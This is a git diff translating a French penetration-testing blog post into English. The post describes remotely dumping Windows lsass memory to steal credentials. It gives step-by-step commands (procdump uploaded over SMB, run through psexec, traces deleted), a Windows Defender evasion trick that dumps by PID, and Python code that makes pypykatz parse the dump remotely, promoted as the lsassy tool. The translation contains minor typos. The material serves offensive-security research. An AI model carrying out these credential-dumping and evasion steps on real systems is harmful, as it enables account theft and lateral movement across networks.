@@ -1,5 +1,5 @@
 ---
-title: "Extraction des secrets de lsass à distance"
+title: "Extracting secrets from lsass remotely"
 date: 2019-11-28 22:40:00
 author: "Pixis"
 layout: post
@@ -7,55 +7,53 @@ permalink: /remote-lsass-dump-passwords/
 redirect_from:
   - "/remote-lass-dump-passwords"
   - "/remote-lass-dump-passwords/"
-disqus_identifier: 0000-0000-0000-00b3
+disqus_identifier: 1000-0000-0000-00b3
 cover: assets/uploads/2019/11/procdump.png
-description: "Cet article présente la modification d'un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d'utiliser Mimikatz et d'être détecté par les Antivirus"
+description: "This article explains how to remotely extract the passwords present in an lsass dump, thus avoiding using Mimikatz and antvirus detection."
 tags:
   - "Active Directory"
   - Windows
 ---
 
-Lors de tests d'intrusion en entreprise, le mouvement latéral et l'élévation de privilèges sont deux concepts fondamentaux pour avancer et prendre le contrôle de la cible. Il existe une multitude de moyens de faire l'un ou l'autre, mais aujourd'hui nous allons présenter une nouvelle technique pour lire le contenu d'un dump de lsass à distance, diminuant significativement la latence et la détection lors de l'extraction de mots de passe sur un ensemble de machines.
+In corporate penetration tests, lateral movement and elevation of privilege are two fundamental concepts for advancing and gaining control of the target. There are a multitude of ways to do one or the other, but today we will present a new technique for reading the content of a lsass dump remotely, significantly reducing latency and detection during password extraction on a set of machines.
 
 <!--more-->
 
 ## Introduction
 
-Un petit message d'introduction pour remercier [mpgn](https://twitter.com/mpgn_x64) qui m'a beaucoup aidé sur différents sujets, et avec qui je travaille en partie sur ce projet, et [Skelsec](https://twitter.com/skelsec) pour ses conseils et ses idées.
+A small introductory message to thank [mpgn] (https://twitter.com/mpgn_x64) who helped me a lot on different subjects, and with whom I worked on this project, and [Skelsec] (https: //twitter.com/skelsec) for his advice and ideas.
 
 ## CrackMapExec
 
-L'outil [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) est développé et maintenu par [Byt3bl33d3r](https://twitter.com/byt3bl33d3r). Son utilité est de pouvoir exécuter des actions sur un ensemble de machines de manière asynchrone, donc relativement rapidement. L'outil permet de s'authentifier sur les machines distantes avec un compte de domaine, un compte local, et un password ou un hash, donc via la technique de "Pass the hash".
+The [CrackMapExec] tool (https://github.com/byt3bl33d3r/CrackMapExec) is developed and maintained by [Byt3bl33d3r] (https://twitter.com/byt3bl33d3r). Its purpose is to asynchronously be able to execute actions on a set of machines. The tool allows you to authenticate on remote machines with a domain or local account, and a password or a LM-NT hash.
 
-CrackMapExec a été développé de manière modulaire. Il est possible de créer ses propres modules que l'outil exécutera lorsqu'il se connectera à une machine. Il en existe déjà beaucoup, comme l'énumération d'informations (DNS, Chrome, AntiVirus), l'exécution de BloodHound ou encore la recherche de mots de passe dans les "Group Policy Preferences".
+CrackMapExec was developed in a modular fashion. It is possible to create its own modules that the tool will execute when it logs in to the machine. There are already a lot of them, such as the enumeration of different information (DNS, Chrome credentials, installed antivirus), the execution of BloodHound ingestor or a module that looks for credentials in "Group Policy Preferences".
 
-## Module Mimikatz
+## Mimikatz module
 
-Il en existe un en particulier, qui était très efficace pendant quelques temps, c'était le module [Mimikatz](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/mimikatz.py). CrackMapExec exécute Mimikatz sur les machines distantes afin d’extraire les identifiants de la mémoire de lsass ou **Local Security Authority SubSystem**. C'est dans ce processus que se trouvent les différents **Security Service Providers** ou **SSP**, c'est à dire les paquets qui gèrent les différents types d'authentification. Pour des raisons pratiques, les identifiants entrés par un utilisateur sont très souvent enregistrés dans l'un de ces paquets pour qu'il n'ait pas à les entrer une nouvelle fois quelques secondes ou minutes plus tard. 
+There is one in particular, which was very effective for some time, it was the module [Mimikatz](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/mimikatz.py). CrackMapExec runs Mimikatz on remote machines to extract credentials from lsass memory or **Local Security Authority SubSystem**. lsass contains all the **Security Service Providers** or **SSP**, which are the packets managing the different types of authentication. For practical reasons, the credentials entered by a user are very often saved in one of these SSPs so that the user doesn't have to enter them again a few seconds or minutes later.
 
-C'est pourquoi Mimikatz extrait les informations situées dans ces différents SSP pour tenter de trouver des secrets d'identification, et les affiche à l'attaquant. Ainsi, si un compte à privilèges s'est connecté sur l'une des machines compromises, le module Mimikatz permet de récupérer rapidement ses identifiants et ainsi profiter des privilèges de ce compte pour compromettre plus de ressources.
+This is why Mimikatz extracts the information located in these different SSPs in an attempt to find some authentication secrets, and displays them to the attacker. Thus, if a privileged account is connected to one of the compromised hosts, the Mimikatz module allows you to quickly extract its credentials and thus take advantage of the privileges of this account to compromise more resources.
 
-Mais aujourd'hui, la majorité des antivirus détecte la présence et/ou l'exécution de Mimikatz et le bloque. CrackMapExec a beau attendre une réponse des machines visées, l'antivirus a joué son rôle, et nous n'avons plus les secrets qui apparaissent sur notre écran.
+But today, the majority of antivirus detects the presence and/or execution of Mimikatz and blocks it so CrackMapExec module is just hanging, waiting for a response from the server, but it never gets it because the process was killed.
 
-## Méthode manuelle : Procdump
+## Manual method : Procdump
 
-Suite à ce constat, je me suis tourné vers une méthode beaucoup plus manuelle mais qui a le mérite d'être fonctionnelle en utilisant l'outil [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).
+Because of this, I used to do this manually with the tool called [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).
 
-Procdump est un outil de la suite [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) qui a été écrite par [Marc Russinovich](https://blogs.technet.microsoft.com/markrussinovich/) pour simplifier la vie des administrateurs. Cette suite d'outils a été adoptée par un grand nombre de personnes, à tel point que Microsoft a décidé de l'acheter vers 2006, et les exécutables sont maintenant signés par Microsoft, donc reconnus comme sains par Windows.
+Procdump is a tool from the [Sysinternals suite](https://docs.microsoft.com/en-us/sysinternals/) which was written by [Marc Russinovich](https://blogs.technet.microsoft.com/markrussinovich/) to helps sysadmins. This toolset has been adopted by a large number of administrators and developpers, so Microsoft decided to buy it in 2006, and the executables are now signed by Microsoft, therefore considered legitimate by Windows.
 
-L'outil procdump fait donc partie de ces outils, et il permet tout simplement de faire un dump de la mémoire d'un processus en cours d'exécution. Il s'attache au processus, lit sa mémoire et la retranscrit dans un fichier.
+The procdump tool is one of these tools, and its job is to dump a running process memory. It attaches to the process, reads its memory and write it into a file.
 
 ```
 procdump --accepteula -ma <processus> processus_dump.dmp
 ```
 
-Or, pour extraire les secrets des utilisateurs, Mimikatz va notamment fouiller dans la mémoire du processus **lsass**, comme expliqué précédemment.
+As explained, Mimikatz looks for credentials in **lsass** memory. Because of this, it's possible to dump lsass memory on a host, download its dump locally and extract the credentials using Mimikatz.
 
-Il est alors possible de faire un dump du processus lsass sur une machine, de rapatrier ce dump sur notre machine locale, et d'extraire les identifiants à l'aide de Mimikatz.
+Procdump can be used to dump lsass, since it is considered as legitimate thus it will not be considered as a malware.
 
-Pour dumper le processus lsass, nous pouvons donc utiliser l'outil procdump, puisque celui-ci est connu de Windows, et ne sera pas considéré comme un logiciel malveillant.
-
-Dans un premier temps, il faut l'envoyer sur le serveur, par exemple en utilisant `smbclient.py` de la suite [impacket](https://github.com/SecureAuthCorp/impacket)
+To do so, send procdump to the server, using `smbclient.py` from the suite [impacket](https://github.com/SecureAuthCorp/impacket) for example.
 
 [![Put Procdump](/assets/uploads/2019/11/put_procdump.png)](/assets/uploads/2019/11/put_procdump.png)
 
@@ -70,7 +68,7 @@ smbclient.py ADSEC.LOCAL/jsnow@DC01.adsec.local
 # put procdump.exe
 ```
 
-Une fois uploadé, il doit être exécuté afin de créer le dump de lsass.
+Once uploaded, procdump needs to be executed in order to create this lsass dump.
 
 [![Excute Procdump](/assets/uploads/2019/11/execute_procdump.png)](/assets/uploads/2019/11/execute_procdump.png)
 
@@ -78,7 +76,7 @@ Une fois uploadé, il doit être exécuté afin de créer le dump de lsass.
 psexec.py adsec.local/jsnow@DC01.adsec.local "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
 ```
 
-Puis le dump doit être rapatrié sur la machine de l'attaquant, suite à quoi nous pouvons supprimer les traces sur la cible (lsass.dmp et procdump.exe).
+The dump then needs to be downloaded on the attacker's host, and traces on the remote host should be erased.
 
 [![Get Procdump](/assets/uploads/2019/11/get_procdump.png)](/assets/uploads/2019/11/get_procdump.png)
 
@@ -89,47 +87,44 @@ Puis le dump doit être rapatrié sur la machine de l'attaquant, suite à quoi n
 # del lsass.dmp
 ```
 
-L'extraction des identifiants se fait de la manière suivante avec Mimikatz : la première ligne permet de charger le dump mémoire, et la deuxième d'extraire les secrets.
+Credentials can be retrieved with Mimikatz: the first line loads the memory dump, and the second one retrieves the secrets.
 
 [![Mimikatz Dump](/assets/uploads/2019/11/mimikatz_dump.png)](/assets/uploads/2019/11/mimikatz_dump.png)
-
 
 ```
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonPasswords
 ```
 
-Cette technique est très pratique puisqu'elle ne génère pas beaucoup de bruit et seul un logiciel légitime est utilisé sur les cibles. 
+This technique is very practical since it does not generate much noise and only legitimate executable is used on the targeted hosts.
 
+## Limits & Improvements
 
-## Limites & Améliorations
-
-Il existe différentes limitations à cette méthode. Nous allons les exposer ici, et proposer des améliorations afin d'y remédier.
+There are different limitations to this method. We will outline them here, and suggest improvements to address them.
 
 ### Linux / Windows
 
-Le premier problème est que lors de mes tests, je suis majoritairement sur mon poste Linux, que ce soit pour les tests web ou les tests internes, et Mimikatz est un outil exclusivement développé pour Windows, de par son fonctionnement. Il serait idéal de pouvoir effectuer la chaine d'attaque décrite ci-dessus depuis un poste Linux.
+The first issue is that during my tests, I am mainly using Linux, whether for web tests or internal tests, and Mimikatz is a tool exclusively developed for Windows. It would be ideal to be able to carry out the attack chain described above from a Linux computer.
 
-Heureusement, le projet [Pypykatz](https://github.com/skelsec/pypykatz) de [Skelsec](https://twitter.com/skelsec) répond à cette attente. Skelsec a développé une implémentation partielle de Mimikatz en python pur. Qui dit python pur, dit cross-plateforme. Cet outil permet notamment, comme Mimikatz, d'extraire les secrets d'un dump lsass.
+Fortunately, the [Pypykatz](https://github.com/skelsec/pypykatz) project by [Skelsec](https://twitter.com/skelsec) can help us solve this issue. Skelsec has developed a partial implementation of Mimikatz in pure python, which means cross-platform. Like Mimikatz, this tool lets us extract the secrets of an lsass dump.
 
 [![Pypykatz Example](/assets/uploads/2019/11/pypykatz_example.png)](/assets/uploads/2019/11/pypykatz_example.png)
-
 
 ```
 pypykatz lsa minidump lsass.dmp
 ```
 
-Grâce à ce projet, il est possible de tout faire depuis une machine Linux. L'ensemble des étapes présentées dans le paragraphe précédent est applicable, et lorsque lsass.dmp a été téléchargé sur la machine de l'attaquant, pypykatz est utilisé pour extraire les noms d'utilisateur et mots de passe ou hash NT de ce dump.
+Thanks to this project, it is now possible to do everything from a Linux machine. All the steps presented in the previous section are applicable, and when lsass dump has been downloaded to the attacker's host, pypykatz is used to extract usernames and passwords or NT hashes from this dump.
 
 So far so good, let's go deeper.
 
 ### Windows Defender
 
-Une deuxième limitation a été rencontrée, elle était due à Windows Defender. Bien que procdump soit un outil de confiance du point de vue de Windows, le fait de faire un dump de lsass est un comportement qui est considéré comme anormal par Windows Defender. Ainsi, lorsque le dump a été effectué, Windows Defender réagit et supprime le dump après quelques secondes. Si nous avons une très bonne connexion, que le dump n'est pas trop gros, et que nous sommes suffisamment rapides, il est possible de télécharger le dump avant sa suppression.
+A second limitation due to Windows Defender was encountered. Although procdump is a trusted tool from Windows perspective, dumping lsass is considered as suspicious activity by Windows Defender. When the dumping process is finished, Windows Defender removes the dump after a few seconds. If we have very good connectivity and the dump is not too big, it is possible to download the dump before it's being deleted.
 
-Cependant ce comportement est trop aléatoire pour s'en contenter. En regardant la documentation de procdump, je me suis rendu compte qu'il était aussi possible de lui fournir un identifiant de process (PID). Et surprise, en lui fournissant non plus le nom mais le PID de lsass, Windows Defender ne réagit plus.
+This is way too random for me. After looking at the procdump documentation, I realized that it was also possible to provide it with a process identifier (PID). And surprise, by providing it with lsass PID, Windows Defender no longer complains.
 
-Il suffit alors de trouver le PID du processus lsass, par exemple avec la commande `tasklist`
+Neat ! We just have to find lsass PID, using the command `tasklist` for example.
 
 ```
 > tasklist /fi "imagename eq lsass.exe"
@@ -139,39 +134,45 @@ Image Name                     PID Session Name        Session#    Mem Usage
 lsass.exe                      640 Services                   0     15,584 K
 ```
 
-Puis une fois en possession de ce PID, nous le fournissons à procdump.
+Once we retrieve this PID, we just use it with procdump.
 
 ```
 procdump -accepteula -ma 640 lsass.dmp
 ```
 
-Nous avons alors tout le loisir de télécharger notre dump et de l'analyser ensuite sur notre machine, comme précédemment.
+We then have plenty of time to download our dump and then analyze it locally. Perfect.
 
-### Méthode manuelle
+### Manual method
 
-Cette opération est certes pratique, mais elle reste manuelle. Nous avons parlé de CrackMapExec et de sa modularité au début de cet article, c'est pourquoi j'ai écrit un module permettant d'automatiser cette opération. Pour chaque cible fournie à CrackMapExec, si l'attaquant est administrateur local de la cible, le module va uploader procdump sur la cible, l'exécuter, récupérer le dump de lsass et va ensuite l'analyser avec pypykatz.
+Sending procdump of the remote host, executing it and the retrieving the dump works perfectly, but it's a very very slow process.
 
-Ce module fonctionne bien, mais il est long, très long à s'exécuter, et parfois le téléchargement du dump de lsass ne se termine pas car le fichier est trop volumineux. Il s'agit alors d'optimiser ce module.
+We talked about CrackMapExec and its modularity at the beginning of this article, that's why I wrote a module to automate this "attack". The module will upload procdump to the target, execute it, retrieve the dump from lsass and will then analyze it with pypykatz for each target specified in CrackMapExec parameters.
 
-### Taille d'un dump
+This module works well, but it takes a long, very long time to run. It even times out sometimes whil edownloading a huge dump because the file is too big.
 
-Nous sommes maintenant en mesure de dumper lsass sur la machine distante et de l'analyser en local sur notre linux de manière automatique avec un nouveau module CrackMapExec. Mais un dump mémoire de processus, ce n'est pas quelques octets, ni même quelques kilo octets. Ce sont plusieurs méga octets, voire dizaines de méga octets pour lsass. Lors de mes tests, certains dumps avaient une taille de plus de 150Mo. Si nous voulons automatiser ce processus, il va falloir trouver une solution, car télécharger un dump lsass sur un sous-réseau de 200 machines amènerait à télécharger plusieurs dizaines de giga octets. D'une part ça prendra beaucoup de temps, surtout si ce sont des machines distantes, dans d'autres pays, et d'autre part un flux réseau anormal pourrait être détecté par les équipes de sécurité.
+We need to make that process more efficient.
 
-Jusque là, nous avions des outils pour répondre à nos problèmes, mais cette fois-ci, il va falloir mettre les mains dans le moteur.
+### Dump size
 
-Nous n'allons pas réinventer la roue pour autant, et nous continuerons d'utiliser pypykatz pour extraire les informations du dump de lsass. L'idée étant de n'utiliser que procdump sur la machine distante, il n'est pas envisageable d'envoyer pypykatz pour faire le travail sur la machine distante. D'une part python peut ne pas être installé, et d'autre part il est possible que pypykatz soit détecté par des antivirus.
+We are now able to dump lsass on the remote host and analyze it locally and automatically on our Linux host thanks to our new CrackMapExec module. But a process memory dump is bigger than a few bytes, or even a few kilobytes. They can be several mega bytes, or even dozens of mega bytes for lsass dumps. During my tests, some dumps were over 150MB.
 
-Ces prérequis en tête, voici la méthode que nous allons utiliser : Afin d'analyser un dump en local, pypykatz doit ouvrir le fichier et lire des octets à certains endroits. Les informations recherchées dans le dump sont présentes à certains offsets, et ne sont pas plus grandes que quelques octets, ou kilo octets. Pypykatz suit des pointeurs présents à des offsets précis afin de trouver l'information qui l'intéresse.
+If we want to automate this process, we will have to find a solution, because downloading an lsass dump on a subnet of 200 machines would lead to downloading dozens of gigabytes. On the first hand it will take a long time, especially for remote machines around the globe, in other countries, and on the other hand abnormal network flow could be detected by the security teams.
 
-L'idée est alors de lire ces offsets et ces adresses à distance, sur le dump présent sur la cible, et de ne rapatrier que les quelques morceaux de dump qui contiennent les informations attendues.
+Ok, so far we had tools to solve our problems, but this time, we will have to get our hands dirty.
 
-En ce sens, regardons comment fonctionne pypykatz. La ligne de commande que nous utilisons jusqu'ici est la suivante :
+We will keep using pypykatz to extract credentials from the lsass dump. Since we only want procdump to be uploaded the the remote host because of it being signed by Microsoft, we can't upload pypykatz.
+
+Having this in mind, here is the method we will use: In order to analyze a local dump, pypykatz must open the file and read bytes at different offsets. Pypykats doesn't read much data. It just needs to read specific amount of data at specific offsets.
+
+To make this more efficient, the idea is to read these offsets and these addresses remotely, on the dump located on the remote target, and to only download the few pieces of dump which contain the expected information.
+
+So let's look at how pypykatz works. The command line we have been using so far is the following :
 
 ```
 pypykatz lsa minidump lsass.dmp
 ```
 
-C'est en fait la classe `LSACMDHelper` qui gère la partie `lsa`. Et lorsqu'on lui fournit un dump de lsass, c'est la méthode `run()` de cette classe qui est appelée. Dans cette méthode `run`, il y a notamment :
+In pypykate, the `LSACMDHelper` class handles the `lsa` argument. When we provide it with an lsass dump, `run()` method is called. This piece of code can be found in this method :
 
 ```python
 ###### Minidump
@@ -199,13 +200,13 @@ elif args.cmd == 'minidump':
                     pass
 ```
 
-On voit alors que le parsing du dump se fait à la ligne suivante :
+lsass dump parsing is achieved at this line :
 
 ```python
 mimi = pypykatz.parse_minidump_file(filename)
 ```
 
-Cette méthode est définie dans `pypykatz.py` :
+This method is defined in `pypykatz.py` file :
 
 ```python
 from minidump.minidumpfile import MinidumpFile
@@ -231,9 +232,9 @@ def parse_minidump_file(filename):
     return mimi
 ```
 
-C'est en fait la classe `MinidumpFile` du packet `minidump` qui gère le parsing. Il faut donc creuser un peu plus loin, et étudier [minidump](https://github.com/skelsec/minidump), également écrit par Skelsec.
+It apperas that it's `MinidumpFile` class from `minidump` package that handles the parsing. We need to go a little deeper and focus on [minidump](https://github.com/skelsec/minidump).
 
-Dans la classe `Minidumpfile`, la méthode `parse` est la suivante :
+In `Minidumpfile` class, `parse` methode is described as follow :
 
 ```python
 @staticmethod
@@ -245,21 +246,19 @@ def parse(filename):
 	return mf
 ```
 
-Voilà, c'est cet endroit qui nous intéresse. Le fichier que nous passons en argument est ouvert puis son contenu est analysé. Je vous passe les extraits de code, mais en suivant la méthode privée `_parse`, nous nous rendons compte que `minidump` utilise les méthodes `read`, `seek` et `tell` pour analyser le fichier.
+This is the code that we were looking for. The lsass dump that we are trying to analyse is opened and then parsed. The parsing is only using `read`, `seek` and `tell` method on the file object. 
 
-Il suffit alors de remplacer la fonction `open` par quelque chose que nous maitrisons afin d'ouvrir un accès vers le fichier distant, et de réécrire les méthodes `read`, `seek` et `tell`. Fort heureusement pour nous, la suite impacket possède des bouts de code qui nous serons très utiles.
-
-Voici une partie de l'implémentation de cette classe. Du code a été simplifié pour la compréhension de l'article.
+We just have to write some code than implements these methods but on a remote file. We'll use Impacket for this purpose.
 
 ```python
 """
-Réécriture de 'open' pour ouvrir et lire un fichier distant
+'open' is rewritten to open and read a remote file
 """
 class open(object):
     def __init__(self, fpath, mode):
         domainName, userName, password, hostName, shareName, filePath = self._parseArg(fpath)
         """
-        ImpacketSMBConnexion est une surclasse de impacket que j'ai écrite pour simplifier cet extrait de code
+        ImpacketSMBConnexion is a child class of impacket written to simplify the code
         """
         self.__conn = ImpacketSMBConnexion(hostName, userName, password, domainName)
         self.__fpath = filePath
@@ -268,7 +267,7 @@ class open(object):
         self.__fid = self.__conn.openFile(self.__tid, self.__fpath)        
 
     """
-    Parsing du nom de fichier pour récupérer les informations d'authentification
+    Parse "filename" to extract remote credentials and lsass dump location
     """
     def _parseArg(self, arg):
         pattern = re.compile(r"^(?P<domainName>[a-zA-Z0-9.-_]+)/(?P<userName>[^:]+):(?P<password>[^@]+)@(?P<hostName>[a-zA-Z0-9.-]+):/(?P<shareName>[^/]+)(?P<filePath>/(?:[^/]*/)*[^/]+)$")
@@ -276,26 +275,12 @@ class open(object):
         if matches is None:
             raise Exception("{} is not valid. Expected format : domain/username:password@host:/share/path/to/file".format(arg))
         return matches.groups()
-        
-
-    """
-    Ouverture du fichier distant
-    """
-    def __enter__(self):
-        self.__fid = self.__conn.openFile(self.__tid, self.__fpath)
-        return self
-
-    """
-    Fermeture de la connexion
-    """
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        self.__conn.close()
     
     def close(self):
         self.__conn.close()
 
     """
-    Lecture de @size octets
+    Read @size bytes
     """
     def read(self, size):
         if size == 0:
@@ -304,20 +289,19 @@ class open(object):
         return value
 
     """
-    Déplacement du pointer d'offset
+    Move offset pointer
     """
     def seek(self, offset, whence=0):
         if whence == 0:
             self.__currentOffset = offset
 
     """
-    Retourne l'offset actuel
+    Return current offset
     """
     def tell(self):
         return self.__currentOffset
 ```
-
-Nous avons donc notre nouvelle classe qui s'authentifie sur un partage réseau, et peut lire un fichier distant avec les méthodes citées. Si nous indiquons à minidump d'utiliser cette classe au lieu de la méthode `open` classique, alors minidump va lire le contenu distant sans sourciller.
+So we have our new class which authenticates on a network share, and can read a remote file with the methods mentioned. If we tell minidump to use this class instead of the classic `open` method, then minidump will read remote content without flinching.
 
 [![Remote Minidump](/assets/uploads/2019/11/minidump_patched.png)](/assets/uploads/2019/11/minidump_patched.png)
 
@@ -326,7 +310,7 @@ Nous avons donc notre nouvelle classe qui s'authentifie sur un partage réseau, 
 minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
 ```
 
-Et de la même manière, pypykatz utilisant minidump, il pourra analyser le dump distant sans le télécharger complètement.
+In the same way, since pypykatz is using minidump, it can analyze the remote dump without downloading it completely.
 
 [![Remote Pypykatz](/assets/uploads/2019/11/pypykatz_patched.png)](/assets/uploads/2019/11/pypykatz_patched.png)
 
@@ -334,20 +318,24 @@ Et de la même manière, pypykatz utilisant minidump, il pourra analyser le dump
 pypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
 ```
 
-### Optimisations
 
-Nous avons maintenant un moyen de lire et analyser un dump lsass à distance, sans avoir à télécharger les 150Mo de dump sur notre machine, c'est une belle avancée ! Cependant, même si nous ne devons pas tout télécharger, le dump prend beaucoup de temps, presqu'autant que le téléchargement. Cela est dû au fait qu'à chaque fois que minidump veut lire quelques octets, une nouvelle requête est effectuée vers le serveur distant. C'est très couteux en temps, et en ajoutant un peu de log, on se rend compte que minidump fait beaucoup, beaucoup de demandes de 4 octets.
+### Optimizations
 
-Une solution que j'ai mise en place pour pallier ce problème est de créer un buffer local, et imposer un nombre minimal d'octets à lire lors d'une requête pour réduire l'overhead. Si une requête demande moins de 4096 octets, et bien nous demanderons quand même 4096 octets, que nous sauvegarderons en local, et nous ne reverrons que les 4 premiers.
+We now have a way to read and analyze an lsass dump remotely, without having to download the full 150MB dump on our machine, it's a great step forward!
 
-Lors des appels suivant à la fonction `read`, si la taille de données demandée est dans le buffer local, on renvoie directement le buffer local, ce qui est bien plus rapide. Si en revanche la donnée n'est pas dans le buffer, alors un nouveau buffer de 4096 octets sera demandé.
+However, even if we don't have to download everything, the dump takes a long time, almost as much as downloading the whole thing. This is due to the fact that each time minidump wants to read a few bytes, a new request is made to the remote server. It is very inefficient. When we log some read calls, we realize that minidump makes many, many requests of 4 bytes.
 
-Cette optimisation fonctionne très bien car minidump effectue beaucoup de lectures concomitantes. Voici comment elle a été mise en place.
+A solution that I have implemented to overcome this problem is to create a local buffer, and impose a minimum number of bytes to read during a request to reduce the overhead. If a request requires less than 4096 bytes, well we will still ask for 4096 bytes, which we will save locally, and we will only return the first bytes to minidump.
+
+During the following calls to the `read` function, if the requested data size is in the local buffer, the local buffer is returned directly, which is **way** faster. If, on the other hand, the data is not in the buffer, then a new buffer of 4096 bytes will be requested.
+
+This optimization works very well because minidump performs a lot of concurrent readings. Here's how it was implemented.
+
 
 ```python
 def read(self, size):
     """
-    On envoie une chaine vide si la taille est 0
+    Return an empty string if 0 bytes are requested
     """
     if size == 0:
         return b''
@@ -356,18 +344,17 @@ def read(self, size):
     if (self.__buffer_data["offset"] <= self.__currentOffset <= self.__buffer_data["offset"] + self.__buffer_data["size"]
             and self.__buffer_data["offset"] + self.__buffer_data["size"] > self.__currentOffset + size):
         """
-        Si les octets demandés sont inclus dans le buffer local self.__buffer_data["buffer"], on renvoie directement la valeur
+        If requested bytes are included in local buffer self.__buffer_data["buffer"], we return theses bytes directly
         """
         value = self.__buffer_data["buffer"][self.__currentOffset - self.__buffer_data["offset"]:self.__currentOffset - self.__buffer_data["offset"] + size]
     else:
         """
-        Sinon, on demande le buffer au fichier distant
+        Else, we request these bytes to the remote host
         """
         self.__buffer_data["offset"] = self.__currentOffset
 
         """
-        Si la demande est inférieure à self.__buffer_min_size octets, on prendra quand même self.__buffer_min_size octets
-        Et on stockera le surplus pour les prochains appels.
+        If the request asks for less then self.__buffer_min_size bytes, we will still ask for self.__buffer_min_size bytes and we will save them in the local buffer for next calls.
         """
         if size < self.__buffer_min_size:
             value = self.__conn.readFile(self.__tid, self.__fid, self.__currentOffset, self.__buffer_min_size)
@@ -383,12 +370,12 @@ def read(self, size):
 
     self.__currentOffset += size
     """
-    On ne renvoie que ce qui est nécessaire
+    Return what was asked, no more.
     """
     return value[:size]
 ```
 
-Cette optimisation permet de drastiquement gagner du temps. Voici un benchmark fait sur ma machine :
+This optimization drastically saves time. Here is a benchmark done on my machine:
 
 ```
 $ python no_opti.py
@@ -398,28 +385,28 @@ $python opti.py
 Function=minidump, Time=0.897719860077
 ```
 
-Sans cette optimisation, le script prenait environ 40 secondes, tandis qu'avec l'optimisation, il prend moins d'une seconde. Moins d'une seconde pour extraire les secrets d'authentification d'un dump lsass distant de plus de 150Mo !
+Without this optimization, the script would take about 40 seconds to run, while with optimization, it would take less than a second. Less than a second to extract authentication secrets from a remote lsass dump larger than 150MB!
 
-## Module CrackMapExec
+## CrackMapExec module
 
-Avec ce nouveau minidump, j'ai modifié le module CrackMapExec qui permet cette fois d'aller dumper lsass sur un ensemble de machines distantes, d'extraire les mots de passe **à distance** sur ces dumps, et de supprimer les traces de mon passage après coup.
+With this new tool, I modified the CrackMapExec module so it extracts passwords **remotely** from lsass dumps.
 
-Comme pypykatz et minidump ne fonctionnent que sous python3.6+ et que CrackMapExec n'est pas encore compatible avec python3, je ne peux pas faire de pull request pour le moment, ni importer pypykatz dans mon module. Pour le moment, l'appel à pypykatz se fait via une exécution de commande shell.
+As pypykatz and minidump only work under python3.6 + and CrackMapExec is not yet compatible with python3, I cannot make a pull request at the moment, nor import pypykatz into my module. For the moment, the call to pypykatz is done via a ew process calling my tool.
 
-[mpgn](https://twitter.com/mpgn_x64) est en train de travailler sur le [port de CrackMapexec vers python 3](https://github.com/byt3bl33d3r/CrackMapExec/pull/323), et quand ce sera fait, je proposerai ce module à Byt3bl33d3r pour intégration dans l'outil.
+[mpgn] (https://twitter.com/mpgn_x64) is working on [CrackMapexec for python 3] (https://github.com/byt3bl33d3r/CrackMapExec/pull/323).
 
 ## Nouveaux outils
 
-En attendant tout ça, voici deux outils que j'ai développés pour concrétiser ces recherches :
+In the meantime, here are two tools that I have written so you can use this technique:
 
-[lsassy](https://github.com/Hackndo/lsassy) est disponible sur mon [Github](https://github.com/Hackndo/lsassy) ou sur [Pypi](https://pypi.org/project/lsassy/). C'est l'interface entre Pypykatz et la cible, qui permet de lire le dump de lsass à distance, avec les optimisations dont on a parlé dans cet article.
+[lsassy](https://github.com/Hackndo/lsassy) is available on my [Github] (https://github.com/Hackndo/lsassy) or on [Pypi] (https://pypi.org/project/lsassy/). It is the interface between Pypykatz and the remote target, which allows to read lsass dumps remotely.
 
-	[Le module CrackMapExec](https://github.com/Hackndo/lsassy/tree/master/cme) permet d'automatiser tout le processus en faisant un dump de lsass sur les machines distantes, et en extrayant les identifiants des personnes connectées en utilisant **lsassy**. Il permet également de détecter les comptes ayant un chemin d'attaque pour devenir administrateur du domaine, en s'appuyant sur les données collectées avec l'outil [Bloodhound](/bloodhound)
+[The CrackMapExec module](https://github.com/Hackndo/lsassy/tree/master/cme) allows you to automate the whole process by doing an lsass dump on the remote hosts, and extracting the credentials of the logged in users using **lsassy**. It also makes it possible to detect accounts with an attack path to become a domain administrator, by relying on the data collected with [Bloodhound](/bloodhound)
 
 ## Conclusion
 
-Il reste du travail à faire pour intégrer ces changements à CrackMapExec, que ce soit au niveau compatibilité des versions de python, propreté et maintenabilité du code, mais ces recherches me sont très utiles pour mieux comprendre les outils que j'utilise au quotidien.
+There is still work to do to integrate these changes to CrackMapExec, whether it is in terms of compatibility with python versions, cleanliness and maintainability of the code, but this research is very useful for me to better understand the tools I use on a daily basis.
 
-J'ai aujourd'hui un outil qui fonctionne bien, rapidement, et qui peut être intégré à CrackMapExec en utilisant quelques tricks, donc qui me sert grandement dans mes tests internes, et j'espère que ça pourra vous être utile.
+I now have a tool that works well, quickly, and which can be integrated into CrackMapExec using a few tricks, so that it is very useful for my internal tests, and I hope that it will be useful for you.
 
-J'espère que cet article vous donnera de nouvelles idées pour faire évoluer les outils d'infosec que nous utilisons au quotidien, à plus tard pour un nouvel article !
+I hope this article will give you new ideas to upgrade infosec tools that we use every day, see you later for a new article!
